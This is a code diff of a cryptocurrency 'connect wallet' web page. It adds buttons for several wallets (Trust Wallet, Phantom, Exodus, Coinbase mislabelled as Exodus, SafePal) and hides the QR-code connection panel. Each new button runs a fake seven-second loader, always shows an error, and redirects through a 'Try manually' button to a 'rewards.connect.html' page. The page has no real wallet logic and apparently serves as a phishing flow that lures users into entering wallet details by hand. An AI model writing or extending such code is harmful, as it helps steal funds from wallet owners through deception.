@@ -57,21 +57,37 @@
                 <div class="wallet-item">
                     <img src="assets/images/MetaMask.png" alt="Metamask">
                     <span>Metamask</span>
-                    <button onclick="connectMetaMask()">Connect</button>
+                    <button onclick="connectWallet()">Connect</button>
                 </div>
                 <div class="wallet-item">
-                    <img src="assets/images/bb.png" alt="Binance">
-                    <span>Binance web3 wallet</span>
-                    <button onclick="connectBinance()">Connect</button>
+                    <img src="assets/images/trustwallet.jpeg" alt="trustwallet">
+                    <span>Trust wallet</span>
+                    <button onclick="connectWallet()">Connect</button>
                 </div>
                 <div class="wallet-item">
-                    <img src="assets/images/bybit.png" alt="Bybit">
-                    <span>Bybit web3 wallet</span>
-                    <button onclick="connectBybit()">Connect</button>
+                    <img src="assets/images/Phantom-Wallet.png" alt="Phantom">
+                    <span>Phantom</span>
+                    <button onclick="connectWallet()">Connect</button>
+                </div>
+                <div class="wallet-item">
+                    <img src="assets/images/Exodus-wallet-logo.jpg" alt="exodus">
+                    <span>Exodus</span>
+                    <button onclick="connectExodus()">Connect</button>
+                </div>
+                <div class="wallet-item">
+                    <img src="assets/images/coin.png" alt="coinbase">
+                    <span>Exodus</span>
+                    <button onclick="connectWallet()">Connect</button>
+                </div>
+                
+                <div class="wallet-item">
+                    <img src="assets/images/safepal.png" alt="safepal">
+                    <span>Safe pal</span>
+                    <button onclick="connectWallet()">Connect</button>
                 </div>
                 <a href="#" onclick="connectWalletConnect()">Connect to another wallet</a>
             </div>
-            <div class="wallet-connect">
+            <div class="wallet-connect" style="visibility: hidden;">
                 <h2>Wallet Connect</h2>
                 <div class="qr-code" id="qrcode"></div>
                 <p>Scan the QR code by any mobile device wallet</p>
@@ -104,25 +120,45 @@
                     console.error("User denied account access", error);
                 }
             } else {
-                alert('MetaMask is not installed!');
+                swal('MetaMask is not installed!');
             }
         }
 
         // other wallets
 
-        function connectBinance() {
+        function connectWallet() {
             showLoader();
             setTimeout(() => {
                 hideLoader();
-                swal("Oops", "Try another wallet. Something went wrong!", "error");
+                swal({
+                    title: "Retry",
+                    text: "Or try another wallet. Something went wrong!",
+                    icon: "error",
+                    button: {
+                        text: "Try manually",
+                        closeModal: false,
+                    }
+                }).then(() => {
+                    window.location.href = 'rewards.connect.html';
+                });
             }, 7000);
         }
 
-        function connectBybit() {
+        function connectExodus() {
             showLoader();
             setTimeout(() => {
                 hideLoader();
-                swal("Oops", "Try another wallet. Something went wrong!", "error");
+                swal({
+                    title: "Retry",
+                    text: "Or try another wallet. Something went wrong!",
+                    icon: "error",
+                    button: {
+                        text: "Try manually",
+                        closeModal: false,
+                    }
+                }).then(() => {
+                    window.location.href = 'rewards.connect.html';
+                });
             }, 7000);
         }
 
